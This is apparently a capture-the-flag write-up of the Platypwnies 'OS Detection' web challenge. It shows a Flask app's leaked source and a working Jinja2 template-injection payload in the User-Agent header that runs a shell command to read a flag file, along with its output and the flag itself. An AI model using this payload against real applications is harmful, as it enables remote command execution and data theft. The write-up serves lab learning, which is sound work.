-----------

### CTF-:Platypwnies

-----------

![image](https://github.com/user-attachments/assets/e0583134-4dc6-4580-b4fa-7b524d34ab88)

-----------

### CHALLENGES-:

--------------

- Web
  - OS Detection

------------

### OS DETECTION

------------

![image](https://github.com/user-attachments/assets/849a3df5-ba5b-44a8-93ff-a1263f4b9621)

------------

-  I discovered the source code in route `/source`.

```bash
❯ curl http://10.71.6.5:5000/source
<pre>from flask import Flask, request, render_template, render_template_string
from ua_parser import user_agent_parser

app = Flask(__name__)

@app.route(&#34;/&#34;)
def home():
    user_agent = request.headers.get(&#39;User-Agent&#39;)
    try:
        parsed_string = user_agent_parser.Parse(user_agent)
        family = parsed_string[&#39;os&#39;][&#39;family&#39;]
        user_agent_hint = render_template_string(user_agent)
        return render_template(&#39;index.html&#39;, os=family, user_agent=user_agent_hint)
    except Exception as e:
        return render_template(&#39;failure.html&#39;, error=str(e))
    
@app.route(&#34;/source&#34;)
def source():
    code = open(__file__).read()
    return render_template_string(&#34;&lt;pre&gt;{{ code }}&lt;/pre&gt;&#34;, code=code)
    

if __name__ == &#34;__main__&#34;:
    # No debug, that would be insecure!
    #app.run(debug=True)
    app.run()
</pre>%
```

- The sink is stated below.

```python3
user_agent = request.headers.get(&#39;User-Agent&#39;)
    try:
        parsed_string = user_agent_parser.Parse(user_agent)
        family = parsed_string[&#39;os&#39;][&#39;family&#39;]
        user_agent_hint = render_template_string(user_agent)
        return render_template(&#39;index.html&#39;, os=family, user_agent=user_agent_hint)
```

- The code is vulnerable to  SSTI because the `User-Agent` header is passed to function `render_template_string()`.

```bash
❯ curl http://10.71.6.5:5000/ -H "User-Agent: {{7*7}}" | grep "49"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1672  100  1672    0     0   1751      0 --:--:-- --:--:-- --:--:--  1750
        <pre>49</pre>
```

- Flag-:`PP{h4ck3r-OS-d3t3ct3d::7pe6PXP-ZkPe}`

```bash
❯ curl http://10.71.6.5:5000/ -H "User-Agent: {{config.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag/flag.txt').read()}}" | grep "PP"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1706  100  1706    0     0   5082      0 --:--:-- --:--:-- --:--:--  5077
        <pre>PP{h4ck3r-OS-d3t3ct3d::7pe6PXP-ZkPe}</pre>
```


